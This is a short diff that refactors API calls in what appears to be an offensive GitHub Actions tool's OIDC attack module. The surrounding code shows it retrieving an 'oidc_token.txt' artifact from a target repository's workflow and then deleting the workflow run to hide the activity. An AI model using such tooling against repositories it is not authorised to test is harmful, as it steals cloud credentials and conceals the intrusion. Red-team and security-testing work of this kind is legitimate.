+++ gatox/attack/oidc/oidc_attack.py
@@ -161,7 +161,7 @@ class OIDCAttack(Attacker):
             else:
                 branch = "".join(random.choices(string.ascii_lowercase, k=10))
 
-            res = await self.api.get_repo_branch(target_repo, branch)
+            res = await self.api.commit.get_repo_branch(target_repo, branch)
             if res == -1:
                 Output.error("Failed to check for remote branch!")
                 return
@@ -189,8 +189,10 @@ class OIDCAttack(Attacker):
                 expected = set(artifact_to_env.keys())
                 all_artifacts = {}
                 for _ in range(30):
-                    all_artifacts = await self.api.retrieve_all_workflow_artifacts(
-                        target_repo, workflow_id
+                    all_artifacts = (
+                        await self.api.action.retrieve_all_workflow_artifacts(
+                            target_repo, workflow_id
+                        )
                     )
                     if expected.issubset(all_artifacts.keys()):
                         break
@@ -209,7 +211,7 @@ class OIDCAttack(Attacker):
             else:
                 artifact = None
                 for _ in range(30):
-                    artifact = await self.api.retrieve_workflow_artifact(
+                    artifact = await self.api.action.retrieve_workflow_artifact(
                         target_repo, workflow_id
                     )
                     if artifact and "oidc_token.txt" in artifact:
@@ -230,7 +232,9 @@ class OIDCAttack(Attacker):
             if delete_action and (
                 not finegrain_scopes or "actions:write" in finegrain_scopes
             ):
-                res = await self.api.delete_workflow_run(target_repo, workflow_id)
+                res = await self.api.action.delete_workflow_run(
+                    target_repo, workflow_id
+                )
                 if not res:
                     Output.error("Failed to delete workflow!")
                 else:
